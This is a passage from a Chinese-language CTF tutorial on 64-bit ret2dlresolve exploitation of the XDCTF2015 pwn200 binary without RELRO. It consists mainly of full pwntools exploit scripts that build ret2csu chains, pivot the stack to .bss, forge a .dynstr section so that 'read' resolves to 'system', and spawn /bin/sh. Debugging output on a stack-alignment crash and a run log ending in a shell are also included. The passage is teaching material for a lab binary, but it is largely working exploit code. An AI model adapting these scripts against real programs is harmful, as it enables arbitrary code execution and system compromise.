<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>

<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set rsp = new_stack</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x188</span> <span class=c1># new stack size is 0x188</span>
<span class=n>new_stack</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x200</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>payload1</span> <span class=o>=</span> <span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>new_stack</span><span class=p>,</span><span class=n>stack_size</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># construct fake stack</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600988</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>  <span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)))</span>  <span class=c1># construct a fake dynstr section</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>),</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)))</span>  <span class=c1># read /bin/sh\x00</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400773</span><span class=p>)</span> <span class=c1># pop rdi; ret</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400516</span><span class=p>)</span> <span class=c1># the second instruction of read@plt </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>stack_size</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>


<span class=c1># reuse the vuln to stack pivot</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>new_stack</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()</span><span class=o>+</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=c1># now, we are on the new stack</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x600B30</span><span class=p>))</span> <span class=c1># fake dynstr location</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span> <span class=c1># fake dynstr</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>

<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>此時，我們發現程序又崩了，通過 coredump</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>gdb<span class=w> </span>-c<span class=w> </span>core
</code></pre></div> <p>我們發現，在處理 xmm 相關的指令時崩了</p> <div class=highlight><pre><span></span><code> ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0
   0x7fa8677a339b    call   0x7fa8677931c0 &lt;0x7fa8677931c0&gt;

   0x7fa8677a33a0    lea    rsi, [rip + 0x39e259]
   0x7fa8677a33a7    xor    edx, edx
   0x7fa8677a33a9    mov    edi, 3
   0x7fa8677a33ae    call   0x7fa8677931c0 &lt;0x7fa8677931c0&gt;

   0x7fa8677a33b3    xor    edx, edx
   0x7fa8677a33b5    mov    rsi, rbp
   0x7fa8677a33b8    mov    edi, 2
   0x7fa8677a33bd    call   0x7fa8677931f0 &lt;0x7fa8677931f0&gt;

   0x7fa8677a33c2    mov    rax, qword ptr [rip + 0x39badf]
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x600d18 ◂— 0x0
01:0008│      0x600d20 —▸ 0x7fa8679080f7 ◂— 0x2f6e69622f00632d /* &#39;-c&#39; */
02:0010│      0x600d28 ◂— 0x0
03:0018│      0x600d30 —▸ 0x40076a ◂— pop    rbx
04:0020│      0x600d38 —▸ 0x7fa8677a3400 ◂— 0x9be1f8b53
05:0028│      0x600d40 —▸ 0x600d34 ◂— 0x677a340000000000
06:0030│      0x600d48 ◂— 0x8000000000000006
07:0038│      0x600d50 ◂— 0x0
</code></pre></div> <p>由於 xmm 相關指令要求地址應該是 16 字節對齊的，而此時 rsp 並不是 16 字節對齊的。因此我們可以簡單地調整一下棧，來使得棧是 16 字節對齊的。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400750</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
<span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
<span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>

<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set rsp = new_stack</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x1a0</span> <span class=c1># new stack size is 0x1a0</span>
<span class=n>new_stack</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x200</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>payload1</span> <span class=o>=</span> <span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>new_stack</span><span class=p>,</span><span class=n>stack_size</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=c1># gdb.attach(io)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># construct fake stack</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600988</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>  <span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)))</span>  <span class=c1># construct a fake dynstr section</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>),</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)))</span>  <span class=c1># read /bin/sh\x00</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400771</span><span class=p>)</span> <span class=c1>#pop rsi; pop r15; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400773</span><span class=p>)</span> <span class=c1># pop rdi; ret</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400516</span><span class=p>)</span> <span class=c1># the second instruction of read@plt </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
<span class=c1># print(len(rop.chain()))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>stack_size</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>


<span class=c1># reuse the vuln to stack pivot</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>new_stack</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()</span><span class=o>+</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=c1># now, we are on the new stack</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x600B30</span><span class=p>))</span> <span class=c1># fake dynstr location</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span> <span class=c1># fake dynstr</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>

<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>最終執行效果如下</p> <div class=highlight><pre><span></span><code>❯ python exp-no-relro-stack-pivot.py
[+] Starting local process &#39;./main_no_relro_64&#39;: pid 41149
[*] &#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64&#39;
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for &#39;./main_no_relro_64&#39;
[*] Switching to interactive mode
$ ls
exp-no-relro-stack-pivot.py  main_no_relro_64
</code></pre></div> <p>到了這裏我們發現，與 32 位不同，在 64 位下進行棧遷移然後利用 ret2dlresolve 攻擊需要精心構造棧的位置，以避免破壞 .dynamic 節的內容。</p> <p>這裏我們同時給出另外一種方法，即通過多次使用 vuln 函數進行漏洞利用。這種方式看起來會更加清晰一些。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>bss_addr</span><span class=p>))</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400750</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
<span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
<span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>

<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set rsp = new_stack</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x200</span> <span class=c1># new stack size is 0x200</span>
<span class=n>new_stack</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>

<span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600988</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=nb>print</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>dump</span><span class=p>())</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x600B30</span><span class=o>+</span><span class=mh>0x100</span><span class=p>))</span>


<span class=c1># construct a fake dynstr section</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
